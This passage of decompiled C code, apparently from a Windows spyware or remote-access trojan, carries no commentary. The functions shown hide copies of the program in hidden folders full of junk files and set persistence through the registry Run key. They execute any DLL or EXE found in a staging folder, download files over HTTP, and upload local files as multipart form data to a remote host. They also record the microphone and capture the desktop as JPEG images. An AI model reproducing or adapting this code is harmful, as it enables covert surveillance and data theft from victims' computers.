            local_124 = 0x6e6962;
            break;
          case 5:
            local_124 = 0x706d64;
            break;
          case 6:
            local_124 = 0x737973;
            break;
          case 7:
            local_124 = 0x676d69;
          }
        }
        sprintf(acStack_150,"%s\\%s.%s");
        BVar4 = PathFileExistsA(acStack_150);
        if ((BVar4 == 0) && (_File = fopen(acStack_150,"w"), _File != (FILE *)0x0)) {
          local_140 = rand();
          local_14c = (longlong)local_140 * 0x66666667;
          iVar2 = (local_140 % 10) * 0x400;
          if (0 < iVar2) {
            do {
              rand();
              fprintf(_File,"%c");
              iVar2 = iVar2 + -1;
            } while (iVar2 != 0);
          }
          fclose(_File);
          FUN_004082d0(acStack_150);
        }
      }
      else {
        do {
          uVar3 = *puVar5;
          puVar5 = puVar5 + 1;
        } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
        local_12c = &stack0xfffffe94;
        strlen(param_1);
        FUN_00421910();
        sprintf(acStack_150,"%s\\%s");
        BVar4 = PathFileExistsA(acStack_150);
        if ((BVar4 == 0) && (param_2 < 1)) {
          _mkdir(acStack_150);
          FUN_004029e0(acStack_150,param_2 + 1);
        }
      }
      local_128 = local_128 + 1;
      bVar6 = SBORROW4(local_128,local_130);
      iVar2 = local_128 - local_130;
    }
  }
  return;
}



void FUN_00402eb0(void)

{
  char *pszPath;
  BOOL BVar1;
  BYTE *pszPath_00;
  char *pcVar2;
  int iVar3;
  size_t sVar4;
  LPCSTR pCVar5;
  time_t tVar6;
  _OSVERSIONINFOA local_1cc;
  CHAR local_12c [284];
  
  tVar6 = time((time_t *)0x0);
  srand((uint)tVar6);
  pszPath = FUN_00404240();
  BVar1 = PathFileExistsA(pszPath);
  if (BVar1 == 0) {
    _mkdir(pszPath);
    SetFileAttributesA(pszPath,6);
    FUN_004082d0(pszPath);
    FUN_004029e0(pszPath,0);
  }
  SetCurrentDirectoryA(pszPath);
  pszPath_00 = (BYTE *)FUN_00404380();
  GetModuleFileNameA((HMODULE)0x0,local_12c,0x104);
  BVar1 = PathFileExistsA((LPCSTR)pszPath_00);
  if (BVar1 != 0) {
    remove((char *)pszPath_00);
  }
  FUN_004081d0(local_12c,(char *)pszPath_00,'\0');
  FUN_00409d60((char *)pszPath_00);
  SetFileAttributesA((LPCSTR)pszPath_00,6);
  FUN_004082d0((LPCSTR)pszPath_00);
  local_1cc.dwOSVersionInfoSize = 0x94;
  GetVersionExA(&local_1cc);
  if (local_1cc.dwMajorVersion < 6) {
    sVar4 = strlen((char *)pszPath_00);
    pCVar5 = (LPCSTR)FUN_004046d0();
    FUN_00408bf0((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",1,pCVar5,
                 pszPath_00,sVar4);
    iVar3 = strcmp(local_12c,(char *)pszPath_00);
  }
  else {
    pcVar2 = (char *)FUN_004046d0();
    FUN_00408d20(pcVar2,(char *)pszPath_00);
    iVar3 = strcmp(local_12c,(char *)pszPath_00);
  }
  if ((iVar3 != 0) && (BVar1 = PathFileExistsA((LPCSTR)pszPath_00), BVar1 != 0)) {
    if (DAT_00428100 != (HANDLE)0x0) {
      CloseHandle(DAT_00428100);
    }
    ShellExecuteA((HWND)0x0,"open",(LPCSTR)pszPath_00,"",(LPCSTR)0x0,5);
    if (pszPath != (char *)0x0) {
      FUN_0041f880(pszPath);
    }
    if (pszPath_00 != (BYTE *)0x0) {
      FUN_0041f880(pszPath_00);
    }
                    // WARNING: Subroutine does not return
    exit(0);
  }
  if (pszPath != (char *)0x0) {
    FUN_0041f880(pszPath);
  }
  if (pszPath_00 != (BYTE *)0x0) {
    FUN_0041f880(pszPath_00);
  }
  return;
}



void FUN_00403100(void)

{
  uint uVar1;
  int *piVar2;
  char *pszPath;
  BOOL BVar3;
  char *pcVar4;
  int iVar5;
  uint *puVar6;
  char acStack_150 [8];
  int *local_148;
  int local_144;
  undefined *local_140;
  undefined local_13c [20];
  uint local_128 [70];
  
  local_140 = &stack0xfffffe94;
  pszPath = FUN_00404490();
  BVar3 = PathFileExistsA(pszPath);
  if (BVar3 == 0) {
    _mkdir(pszPath);
    SetFileAttributesA(pszPath,6);
    FUN_004082d0(pszPath);
  }
  strlen(pszPath);
  FUN_00421910();
  sprintf(acStack_150,"%s\\*");
  local_144 = _findfirst();
  if (local_144 != 0) {
    do {
      local_148 = (int *)&stack0xfffffe94;
      strlen(pszPath);
      puVar6 = local_128;
      do {
        uVar1 = *puVar6;
        puVar6 = puVar6 + 1;
      } while ((uVar1 + 0xfefefeff & ~uVar1 & 0x80808080) == 0);
      FUN_00421910();
      sprintf(acStack_150,"%s\\%s");
      pcVar4 = strstr((char *)local_128,".dll");
      if (pcVar4 == (char *)0x0) {
        pcVar4 = strstr((char *)local_128,".exe");
        if (pcVar4 != (char *)0x0) {
          ShellExecuteA((HWND)0x0,"open",acStack_150,"",(LPCSTR)0x0,5);
        }
      }
      else {
        LoadLibraryA(acStack_150);
      }
      piVar2 = local_148;
      local_148[1] = (int)local_13c;
      *piVar2 = local_144;
      iVar5 = _findnext();
    } while (iVar5 == 0);
    _findclose(local_144);
  }
  if (pszPath != (char *)0x0) {
    FUN_0041f880(pszPath);
  }
  return;
}



void FUN_004032f0(LPVOID param_1)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  FUN_004023c0();
  FUN_004026f0();
  FUN_004028e0();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00404ce0,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  while (DAT_00428011 == '\0') {
    Sleep(0x32);
  }
  FUN_00402eb0();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00401290,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00401430,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_004017c0,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_004014e0,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00401ae0,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  FUN_00403100();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_0040a050,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00404fc0,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00405740,(LPVOID)0x0,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00405950,param_1,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00405bd0,param_1,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00407ca0,param_1,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00406170,param_1,0,
               (LPDWORD)0x0);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_0040a190,param_1,0,
               (LPDWORD)0x0);
  do {
    Sleep(300000);
  } while( true );
}



char * __cdecl FUN_00403600(undefined4 param_1,undefined4 param_2,char param_3,int *param_4)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined *puVar4;
  int iVar5;
  int iVar6;
  char *local_474;
  char *local_46c;
  int local_468;
  undefined4 local_464;
  LPVOID local_460;
  undefined4 local_45c;
  undefined *local_448;
  undefined *local_444;
  undefined *local_440;
  undefined *local_43c;
  undefined *local_438;
  undefined local_42c [1024];
  char *local_2c;
  int local_28;
  undefined local_1c [12];
  
  local_440 = local_1c;
  local_438 = &stack0xfffffb54;
  local_448 = &DAT_0041efe0;
  local_444 = &DAT_00422e58;
  local_43c = &DAT_004039c3;
  FUN_00421a50(&local_460);
  local_464 = 0;
  local_45c = 0xffffffff;
  iVar1 = InternetGetConnectedState();
  local_46c = (char *)0x0;
  if (iVar1 != 0) {
    local_474 = (char *)0x0;
    local_45c = 0xffffffff;
    uVar2 = FUN_004079f0(0x2e);
    iVar1 = InternetOpenA(uVar2,0);
    if (iVar1 != 0) {
      iVar3 = InternetConnectA(iVar1,param_1);
      if (iVar3 != 0) {
        puVar4 = &DAT_00424490;
        if (param_3 == '\0') {
          puVar4 = &DAT_00424495;
        }
        local_45c = 0xffffffff;
        iVar5 = HttpOpenRequestA(iVar3,puVar4,param_2,0,0,0,0x400000,1);
        if (iVar5 != 0) {
          iVar6 = HttpSendRequestA(iVar5,0,0,0,0);
          if (iVar6 != 0) {
            FUN_00408670(&local_2c);
            if (param_4 == (int *)0x0) {
              while( true ) {
                local_45c = 1;
                iVar6 = InternetReadFile(iVar5,local_42c,0x3ff,&local_468);
                if ((iVar6 == 0) || (local_468 == 0)) break;
                local_42c[local_468] = 0;
                local_45c = 1;
                FUN_004086e0(&local_2c,(int)local_42c,local_468);
              }
            }
            else {
              while( true ) {
                local_45c = 1;
                iVar6 = InternetReadFile(iVar5,local_42c,0x3ff,&local_468);
                if ((iVar6 == 0) || (local_468 == 0)) break;
                local_42c[local_468] = 0;
                local_45c = 1;
                FUN_004086e0(&local_2c,(int)local_42c,local_468);
                *param_4 = *param_4 + local_468;
              }
            }
            if (local_28 < 1) {
              local_45c = 1;
              local_474 = (char *)FUN_0041f7e0(8);
              *local_474 = '\0';
            }
            else {
              local_45c = 1;
              local_474 = (char *)FUN_0041f7e0(local_28 + 1);
              strcpy(local_474,local_2c);
            }
            local_45c = 0xffffffff;
            FUN_004086c0(&local_2c);
          }
          local_45c = 0xffffffff;
          InternetCloseHandle(iVar5);
        }
        local_45c = 0xffffffff;
        InternetCloseHandle(iVar3);
      }
      local_45c = 0xffffffff;
      InternetCloseHandle(iVar1);
    }
    local_46c = local_474;
  }
  FUN_00421b30(&local_460);
  return local_46c;
}



undefined __cdecl FUN_00403a30(undefined4 param_1,undefined4 param_2,char *param_3)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  FILE *_File;
  undefined local_425;
  size_t local_424;
  undefined4 local_420;
  undefined local_41c [1036];
  
  local_420 = 0;
  iVar1 = InternetGetConnectedState(&local_420,0);
  if (iVar1 == 0) {
    return 0;
  }
  local_425 = 0;
  remove(param_3);
  uVar2 = FUN_004079f0(0x2e);
  iVar1 = InternetOpenA(uVar2,0,0,0,0);
  if (iVar1 != 0) {
    iVar3 = InternetConnectA(iVar1,param_1,0x50,0,0,3,0,1);
    if (iVar3 != 0) {
      iVar4 = HttpOpenRequestA(iVar3,&DAT_00424495,param_2,0,0,0,0x400000,1);
      if (iVar4 != 0) {
        iVar5 = HttpSendRequestA(iVar4,0,0,0,0);
        if (iVar5 != 0) {
          local_425 = 1;
          _File = fopen(param_3,"wb");
          while (_File != (FILE *)0x0) {
            iVar5 = InternetReadFile(iVar4,local_41c,0x3ff,&local_424);
            if ((iVar5 == 0) || (local_424 == 0)) {
              if (_File != (FILE *)0x0) {
                fclose(_File);
              }
              break;
            }
            local_41c[local_424] = 0;
            fwrite(local_41c,1,local_424,_File);
          }
        }
        InternetCloseHandle(iVar4);
      }
      InternetCloseHandle(iVar3);
    }
    InternetCloseHandle(iVar1);
  }
  return local_425;
}



bool __cdecl
FUN_00403c70(char *param_1,undefined4 param_2,char *param_3,LPCSTR param_4,char *param_5)

{
  undefined *puVar1;
  int iVar2;
  BOOL BVar3;
  void *pvVar4;
  uint uVar5;
  int iVar6;
  undefined **ppuVar7;
  undefined **ppuVar8;
  uint *puVar9;
  uint *puVar10;
  undefined **_Dest;
  uint uVar11;
  undefined *puStack_110;
  undefined4 uStack_10c;
  char *pcStack_108;
  undefined4 uStack_104;
  undefined4 uStack_100;
  undefined4 uStack_fc;
  undefined4 uStack_f8;
  bool local_9d;
  bool local_9c;
  size_t local_98;
  undefined4 local_94;
  LPVOID local_90;
  undefined4 local_8c;
  undefined *local_78;
  undefined *local_74;
  undefined *local_70;
  undefined *local_6c;
  undefined *local_68;
  void *local_5c [4];
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined local_1c [12];
  
  local_68 = &stack0xffffff14;
  local_70 = local_1c;
  local_78 = &DAT_0041efe0;
  local_74 = &DAT_00422e5e;
  local_6c = &DAT_004041fa;
  FUN_00421a50(&local_90);
  local_94 = 0;
  local_8c = 0xffffffff;
  iVar2 = InternetGetConnectedState();
  local_9c = false;
  if (iVar2 != 0) {
    local_8c = 0xffffffff;
    uStack_f8 = 0x403d1a;
    BVar3 = PathFileExistsA(param_4);
    local_9c = false;
    if (BVar3 != 0) {
      local_9d = false;
      local_8c = 0xffffffff;
      uStack_f8 = 0x403d4b;
      FUN_004079f0(0x2e);
      uStack_f8 = 0x403d65;
      iVar2 = InternetOpenA();
      if (iVar2 != 0) {
        uStack_f8 = 0x403db5;
        iVar2 = InternetConnectA();
        if (iVar2 != 0) {
          local_94 = 0x8468c200;
          uStack_f8 = 0;
          uStack_100 = 0;
          uStack_104 = 0;
          uStack_fc = 0x8468c200;
          pcStack_108 = "HTTP/1.0";
          puStack_110 = &DAT_00424490;
          uStack_10c = param_2;
          iVar2 = HttpOpenRequestA();
          if (iVar2 != 0) {
            local_4c._0_1_ = '-';
            local_4c._1_1_ = '-';
            local_4c._2_1_ = '-';
            local_4c._3_1_ = '-';
            local_48._0_1_ = '-';
            local_48._1_1_ = '-';
            local_48._2_1_ = '-';
            local_48._3_1_ = '-';
            local_44._0_1_ = '-';
            local_44._1_1_ = '-';
            local_44._2_1_ = '-';
            local_44._3_1_ = '-';
            local_40._0_1_ = '-';
            local_40._1_1_ = '-';
            local_40._2_1_ = '-';
            local_40._3_1_ = '-';
            local_38._0_1_ = '-';
            local_38._1_1_ = '-';
            local_38._2_1_ = '-';
            local_38._3_1_ = '-';
            local_34._0_1_ = '-';
            local_34._1_1_ = '-';
            local_34._2_1_ = '-';
            local_34._3_1_ = 'u';
            local_30._0_1_ = 'p';
            local_30._1_1_ = 'l';
            local_30._2_1_ = 'o';
            local_30._3_1_ = 'a';
            puVar10 = &local_4c;
            local_2c._0_1_ = 'd';
            local_2c._1_1_ = 'e';
            local_2c._2_1_ = 'r';
            local_2c._3_1_ = '\0';
            local_3c._0_1_ = '-';
            local_3c._1_1_ = '-';
            local_3c._2_1_ = '-';
            local_3c._3_1_ = '-';
            strlen(param_1);
            do {
              uVar5 = *puVar10;
              puVar10 = puVar10 + 1;
            } while ((uVar5 + 0xfefefeff & ~uVar5 & 0x80808080) == 0);
            FUN_00421910();
            _Dest = &puStack_110;
            puVar10 = &local_4c;
            local_8c = 0xffffffff;
            sprintf((char *)_Dest,"Host: %s\r\nContent-Type: multipart/form-data; boundary=%s");
            local_98 = 0;
            pvVar4 = FUN_00408490(param_4,&local_98);
            do {
              uVar5 = *puVar10;
              puVar10 = puVar10 + 1;
            } while ((uVar5 + 0xfefefeff & ~uVar5 & 0x80808080) == 0);
            strlen(param_3);
            strlen(param_5);
            FUN_00421910();
            local_8c = 0xffffffff;
            sprintf((char *)&puStack_110,
                    "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"file.raw\"\r\nContent-Type: %s\r\n\r\n"
                   );
            FUN_00408560(local_5c);
            ppuVar8 = &puStack_110;
            do {
              ppuVar7 = ppuVar8;
              ppuVar8 = ppuVar7 + 1;
              uVar11 = (uint)(*ppuVar7 + -0x1010101) & ~(uint)*ppuVar7;
              uVar5 = uVar11 & 0x80808080;
            } while (uVar5 == 0);
            if ((uVar11 & 0x8080) == 0) {
              uVar5 = uVar5 >> 0x10;
              ppuVar8 = (undefined **)((int)ppuVar7 + 6);
            }
            local_8c = 1;
            FUN_004085d0(local_5c,(int)&puStack_110,
                         (int)ppuVar8 +
                         ((-3 - (uint)CARRY1((byte)uVar5,(byte)uVar5)) - (int)&puStack_110));
            FUN_004085d0(local_5c,(int)pvVar4,local_98);
            FUN_004085d0(local_5c,0x424563,4);
            puVar10 = &local_4c;
            do {
              puVar9 = puVar10;
              puVar10 = puVar9 + 1;
              uVar11 = *puVar9 + 0xfefefeff & ~*puVar9;
              uVar5 = uVar11 & 0x80808080;
            } while (uVar5 == 0);
            if ((uVar11 & 0x8080) == 0) {
              uVar5 = uVar5 >> 0x10;
              puVar10 = (uint *)((int)puVar9 + 6);
            }
            local_8c = 1;
            FUN_004085d0(local_5c,(int)&local_4c,
                         (int)puVar10 +
                         ((-3 - (uint)CARRY1((byte)uVar5,(byte)uVar5)) - (int)&local_4c));
            FUN_004085d0(local_5c,0x424568,4);
            do {
              puVar1 = *_Dest;
              _Dest = _Dest + 1;
            } while (((uint)(puVar1 + -0x1010101) & ~(uint)puVar1 & 0x80808080) == 0);
            local_8c = 1;
            iVar6 = HttpSendRequestA();
            local_9d = iVar6 != 0;
            InternetCloseHandle(iVar2);
            local_8c = 0xffffffff;
            FUN_004085b0(local_5c);
          }
          local_8c = 0xffffffff;
          InternetCloseHandle();
        }
        local_8c = 0xffffffff;
        InternetCloseHandle();
      }
      local_9c = local_9d;
    }
  }
  uStack_f8 = 0x403cec;
  FUN_00421b30(&local_90);
  return local_9c;
}



char * FUN_00404240(void)

{
  char *pcVar1;
  size_t sVar2;
  size_t sVar3;
  char *pcVar4;
  BOOL BVar5;
  char *_Dest;
  int iVar6;
  int iVar7;
  time_t tVar8;
  
  iVar7 = 0;
  tVar8 = time((time_t *)0x0);
  srand((uint)tVar8);
  do {
    iVar6 = 0;
    do {
      pcVar1 = getenv((char *)(&DAT_004280dc)[iVar7]);
      sVar2 = strlen(pcVar1);
      sVar3 = strlen((char *)(&DAT_004280c0)[iVar6]);
      pcVar1 = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
      pcVar4 = getenv((char *)(&DAT_004280dc)[iVar7]);
      sprintf(pcVar1,"%s\\%s",pcVar4,(&DAT_004280c0)[iVar6]);
      BVar5 = PathFileExistsA(pcVar1);
      if (BVar5 != 0) {
        return pcVar1;
      }
      if (pcVar1 != (char *)0x0) {
        FUN_0041f880(pcVar1);
      }
      iVar6 = iVar6 + 1;
    } while (iVar6 < 7);
    iVar7 = iVar7 + 1;
  } while (iVar7 < 1);
  iVar7 = rand();
  pcVar4 = getenv((char *)(&DAT_004280dc)[iVar7 % 1]);
  iVar7 = rand();
  pcVar1 = (char *)(&DAT_004280c0)[iVar7 % 7];
  sVar2 = strlen(pcVar4);
  sVar3 = strlen(pcVar1);
  _Dest = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
  sprintf(_Dest,"%s\\%s",pcVar4,pcVar1);
  return _Dest;
}



char * FUN_00404380(void)

{
  char *pcVar1;
  size_t sVar2;
  size_t sVar3;
  char *pcVar4;
  BOOL BVar5;
  char *_Dest;
  int iVar6;
  time_t tVar7;
  
  iVar6 = 0;
  tVar7 = time((time_t *)0x0);
  srand((uint)tVar7);
  do {
    pcVar1 = FUN_00404240();
    sVar2 = strlen(pcVar1);
    sVar3 = strlen((char *)(&DAT_004280a0)[iVar6]);
    pcVar4 = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
    sprintf(pcVar4,"%s\\%s",pcVar1,(&DAT_004280a0)[iVar6]);
    if (pcVar1 != (char *)0x0) {
      FUN_0041f880(pcVar1);
    }
    BVar5 = PathFileExistsA(pcVar4);
    if (BVar5 != 0) {
      return pcVar4;
    }
    if (pcVar4 != (char *)0x0) {
      FUN_0041f880(pcVar4);
    }
    iVar6 = iVar6 + 1;
  } while (iVar6 < 8);
  pcVar4 = FUN_00404240();
  iVar6 = rand();
  pcVar1 = (char *)(&DAT_004280a0)[iVar6 % 8];
  sVar2 = strlen(pcVar4);
  sVar3 = strlen(pcVar1);
  _Dest = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
  sprintf(_Dest,"%s\\%s",pcVar4,pcVar1);
  if (pcVar4 != (char *)0x0) {
    FUN_0041f880(pcVar4);
  }
  return _Dest;
}



char * FUN_00404490(void)

{
  char *pcVar1;
  size_t sVar2;
  size_t sVar3;
  char *pcVar4;
  BOOL BVar5;
  char *_Dest;
  int iVar6;
  time_t tVar7;
  
  iVar6 = 0;
  tVar7 = time((time_t *)0x0);
  srand((uint)tVar7);
  do {
    pcVar1 = FUN_00404240();
    sVar2 = strlen(pcVar1);
    sVar3 = strlen((char *)(&DAT_0042804c)[iVar6]);
    pcVar4 = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
    sprintf(pcVar4,"%s\\%s",pcVar1,(&DAT_0042804c)[iVar6]);
    BVar5 = PathFileExistsA(pcVar4);
    if (BVar5 != 0) {
      return pcVar4;
    }
    if (pcVar1 != (char *)0x0) {
      FUN_0041f880(pcVar1);
    }
    if (pcVar4 != (char *)0x0) {
      FUN_0041f880(pcVar4);
    }
    iVar6 = iVar6 + 1;
  } while (iVar6 < 7);
  pcVar4 = FUN_00404240();
  iVar6 = rand();
  pcVar1 = (char *)(&DAT_0042804c)[iVar6 % 7];
  sVar2 = strlen(pcVar4);
  sVar3 = strlen(pcVar1);
  _Dest = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
  sprintf(_Dest,"%s\\%s",pcVar4,pcVar1);
  if (pcVar4 != (char *)0x0) {
    FUN_0041f880(pcVar4);
  }
  return _Dest;
}



char * FUN_004045b0(void)

{
  char *pcVar1;
  size_t sVar2;
  size_t sVar3;
  char *pcVar4;
  BOOL BVar5;
  char *_Dest;
  int iVar6;
  time_t tVar7;
  
  iVar6 = 0;
  tVar7 = time((time_t *)0x0);
  srand((uint)tVar7);
  do {
    pcVar1 = FUN_00404240();
    sVar2 = strlen(pcVar1);
    sVar3 = strlen((char *)(&DAT_0042803c)[iVar6]);
    pcVar4 = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
    sprintf(pcVar4,"%s\\%s",pcVar1,(&DAT_0042803c)[iVar6]);
    BVar5 = PathFileExistsA(pcVar4);
    if (BVar5 != 0) {
      return pcVar4;
    }
    if (pcVar1 != (char *)0x0) {
      FUN_0041f880(pcVar1);
    }
    if (pcVar4 != (char *)0x0) {
      FUN_0041f880(pcVar4);
    }
    iVar6 = iVar6 + 1;
  } while (iVar6 < 4);
  pcVar4 = FUN_00404240();
  iVar6 = rand();
  pcVar1 = (char *)(&DAT_0042803c)[iVar6 % 4];
  sVar2 = strlen(pcVar4);
  sVar3 = strlen(pcVar1);
  _Dest = (char *)FUN_0041f7e0(sVar2 + 8 + sVar3);
  sprintf(_Dest,"%s\\%s",pcVar4,pcVar1);
  if (pcVar4 != (char *)0x0) {
    FUN_0041f880(pcVar4);
  }
  return _Dest;
}



undefined4 FUN_004046d0(void)

{
  LSTATUS LVar1;
  int iVar2;
  time_t tVar3;
  HKEY local_14;
  
  iVar2 = 0;
  tVar3 = time((time_t *)0x0);
  srand((uint)tVar3);
  do {
    while (RegOpenKeyExA((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
                         0x20019,&local_14), local_14 == (HKEY)0x0) {
      iVar2 = iVar2 + 1;
      if (7 < iVar2) goto LAB_00404780;
    }
    LVar1 = RegQueryValueExA(local_14,(LPCSTR)(&DAT_00428080)[iVar2],(LPDWORD)0x0,(LPDWORD)0x0,
                             (LPBYTE)0x0,(LPDWORD)0x0);
    if (LVar1 == 0) {
      RegCloseKey(local_14);
      return (&DAT_00428080)[iVar2];
    }
    iVar2 = iVar2 + 1;
    RegCloseKey(local_14);
  } while (iVar2 < 8);
LAB_00404780:
  iVar2 = rand();
  return (&DAT_00428080)[iVar2 % 8];
}



char * FUN_004047c0(void)

{
  char *pcVar1;
  BOOL BVar2;
  size_t sVar3;
  char *_Dest;
  FILE *_File;
  int iVar4;
  time_t tVar5;
  int local_120;
  char local_11c [268];
  
  tVar5 = time((time_t *)0x0);
  srand((uint)tVar5);
  pcVar1 = FUN_004045b0();
  BVar2 = PathFileExistsA(pcVar1);
  if (BVar2 != 0) {
    _File = fopen(pcVar1,"r");
    if (_File != (FILE *)0x0) {
      local_120 = 0;
      if ((*(byte *)&_File->_flag & 0x10) == 0) {
        do {
          local_11c[0] = '\0';
          fscanf(_File,"%s",local_11c);
          local_120 = (local_120 + 1) - (uint)(local_11c[0] == '\0');
        } while ((*(byte *)&_File->_flag & 0x10) == 0);
      }
      fseek(_File,0,0);
      if (0 < local_120) {
        pcVar1 = (char *)FUN_0041f7e0(0x100);
        *pcVar1 = '\0';
        iVar4 = rand();
        if (-1 < iVar4 % local_120) {
          iVar4 = iVar4 % local_120 + 1;
          do {
            fscanf(_File,"%s",pcVar1);
            iVar4 = iVar4 + -1;
          } while (iVar4 != 0);
        }
        fclose(_File);
        return pcVar1;
      }
      fclose(_File);
    }
  }
  if (pcVar1 != (char *)0x0) {
    FUN_0041f880(pcVar1);
  }
  rand();
  pcVar1 = DAT_004280e0;
  sVar3 = strlen(DAT_004280e0);
  _Dest = (char *)FUN_0041f7e0(sVar3 + 8);
  strcpy(_Dest,pcVar1);
  return _Dest;
}



void __cdecl FUN_00405850(char *param_1,DWORD param_2)

{
  strlen(param_1);
  FUN_00421910();
  mciSendStringA("open new type waveaudio alias mic buffer 6",(LPSTR)0x0,0,(HWND)0x0);
  mciSendStringA("record mic",(LPSTR)0x0,0,(HWND)0x0);
  Sleep(param_2);
  mciSendStringA("stop mic",(LPSTR)0x0,0,(HWND)0x0);
  sprintf(&stack0xfffffff0,"save mic %s",param_1);
  mciSendStringA(&stack0xfffffff0,(LPSTR)0x0,0,(HWND)0x0);
  mciSendStringA("close mic",(LPSTR)0x0,0,(HWND)0x0);
  return;
}



undefined4 __cdecl FUN_00405e40(char *param_1,int param_2)

{
  HWND hWnd;
  HDC hdc;
  HDC hdc_00;
  HBITMAP h;
  FILE *_File;
  COLORREF CVar1;
  int cx;
  undefined4 uVar2;
  int iVar3;
  int x;
  int iVar4;
  int cy;
  int y;
  void *local_260;
  undefined4 local_25c [36];
  int local_1cc [7];
  int local_1b0;
  int local_1ac;
  undefined4 local_1a8;
  undefined4 local_1a4;
  tagRECT local_2c;
  
  hWnd = GetDesktopWindow();
  GetWindowRect(hWnd,&local_2c);
  cx = local_2c.right - local_2c.left;
  cy = local_2c.bottom - local_2c.top;
  hdc = GetDC(hWnd);
  hdc_00 = CreateCompatibleDC(hdc);
  h = CreateCompatibleBitmap(hdc,cx,cy);
  uVar2 = 0xfffffffe;
  if (h != (HBITMAP)0x0) {
    SelectObject(hdc_00,h);
    BitBlt(hdc_00,0,0,cx,cy,hdc,local_2c.left,local_2c.top,0xcc0020);
    local_1cc[0] = FUN_0040c144(local_25c);
    FUN_0040a9b8(local_1cc,0x50,0x1a0);
    _File = fopen(param_1,"wb");
    uVar2 = 0xffffffff;
    if (_File != (FILE *)0x0) {
      FUN_0040be68((int)local_1cc,_File);
      local_1a8 = 3;
      local_1a4 = 2;
      local_1b0 = cx;
      local_1ac = cy;
      FUN_0040b79c(local_1cc);
      if (param_2 < 0) {
        param_2 = 0;
      }
      else if (100 < param_2) {
        param_2 = 100;
      }
      FUN_0040b288(local_1cc,param_2,'\0');
      y = 0;
      FUN_0040ad9c(local_1cc,'\x01');
      local_260 = FUN_0041f7e0(cx * 3);
      if (0 < cy) {
        do {
          if (0 < cx) {
            iVar3 = 0;
            x = 0;
            do {
              iVar4 = x + 1;
              CVar1 = GetPixel(hdc_00,x,y);
              *(char *)(iVar3 + (int)local_260) = (char)CVar1;
              *(char *)((int)local_260 + iVar3 + 1) = (char)(CVar1 >> 8);
              *(char *)((int)local_260 + iVar3 + 2) = (char)(CVar1 >> 0x10);
              iVar3 = iVar3 + 3;
              x = iVar4;
            } while (iVar4 < cx);
          }
          y = y + 1;
          FUN_0040ae28(local_1cc,&local_260,1);
        } while (y < cy);
      }
      FUN_0040ab68(local_1cc);
      thunk_FUN_0040d1c0((int)local_1cc);
      FUN_0041f7c0(local_260);
      fclose(_File);
      DeleteDC(hdc_00);
      ReleaseDC(hWnd,hdc);
      uVar2 = 0;
    }
  }
  return uVar2;
}



undefined4 * __cdecl FUN_00406450(char *param_1)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  HINSTANCE pHVar4;
  size_t sVar5;
  LPSTR _Str;
  LPCSTR pCVar6;
  BOOL BVar7;
  FILE *_File;
  char *pcVar8;
  int iVar9;
  uint *puVar10;
  uint *puVar11;
  uint uVar12;
  byte *pbVar13;
  undefined uVar14;
  undefined uVar15;
  char acStack_650 [72];
  undefined4 *local_608;
  undefined4 *local_604;
  undefined4 *local_600;
  undefined4 *local_5fc;
  LPSTR local_5f8;
  char *local_5f4;
  char *local_5f0;
  char *local_5ec;
  size_t local_5e8;
  undefined *local_5e4;
  char *local_5e0;
  int local_5d8;
  char *local_5d4;
  undefined *local_5d0;
  undefined4 *local_5cc;
  MCIDEVICEID local_5c8;
  MCIDEVICEID local_5c4;
  undefined4 *local_5c0;
  undefined4 *local_5bc;
  undefined4 *local_5b8;
  int local_5b4;
